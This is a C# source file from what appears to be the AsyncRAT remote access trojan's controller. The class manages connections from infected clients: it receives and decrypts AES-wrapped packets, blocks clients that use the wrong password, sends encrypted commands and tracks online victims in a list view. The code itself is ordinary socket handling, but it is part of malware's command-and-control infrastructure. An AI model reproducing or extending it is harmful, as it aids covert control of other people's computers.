﻿using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.Handle_Packet;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Drawing;
using System.Diagnostics;
using System.Threading;

namespace AsyncRAT_Sharp.Sockets
{
    class Clients
    {
        public Socket ClientSocket { get; set; }
        private byte[] ClientBuffer { get; set; }
        private long ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public ListViewItem LV { get; set; }
        private object SendSync { get; set; }
        private object EndSendSync { get; set; }
        public string ID { get; set; }

        public Clients(Socket socket)
        {
            if (Settings.Blocked.Contains(socket.RemoteEndPoint.ToString().Split(':')[0]))
            {
                Disconnected();
                return;
            }
            else
                HandleLogs.Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);


            ClientSocket = socket;
            ClientBuffer = new byte[1];
            ClientBuffersize = 0;
            ClientBufferRecevied = false;
            ClientMS = new MemoryStream();
            LV = null;
            SendSync = new object();
            EndSendSync = new object();
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSocket.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (ClientBufferRecevied == false)
                            if (ClientBuffer[0] == 0)
                            {
                                ClientBuffersize = Convert.ToInt64(Encoding.UTF8.GetString(ClientMS.ToArray()));
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                if (ClientBuffersize > 0)
                                {
                                    ClientBuffer = new byte[ClientBuffersize];
                                    Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                    ClientBufferRecevied = true;
                                }
                            }
                            else
                                await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                        else
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                            Settings.Received += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                try
                                {
                                    ThreadPool.QueueUserWorkItem(HandlePacket.Read, new object[] { Settings.aes256.Decrypt(ClientMS.ToArray()), this });
                                }
                                catch (CryptographicException)
                                {
                                    HandleLogs.Addmsg($"Client {ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password, IP blocked", Color.Red);
                                    Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                                    Disconnected();
                                    return;
                                }
                                ClientBuffer = new byte[1];
                                ClientBuffersize = 0;
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {

            try
            {
                if (LV != null)
                {
                    if (Program.form1.listView1.InvokeRequired)
                        Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            LV.Remove();
                        }));
                    lock (Settings.Online)
                        Settings.Online.Remove(this);
                }
            }
            catch { }

            try
            {
                ClientMS?.Dispose();
                ClientSocket?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object Msgs)
        {
            lock (SendSync)
            {
                if (ClientSocket == null)
                {
                    Disconnected();
                    return;
                }
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }

                try
                {
                    byte[] buffer = Settings.aes256.Encrypt((byte[])Msgs);
                    byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        public void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    int sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Debug.WriteLine("/// Server Sent " + sent.ToString() + " Bytes  ///");
                    Settings.Sent += sent;
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }
    }
}
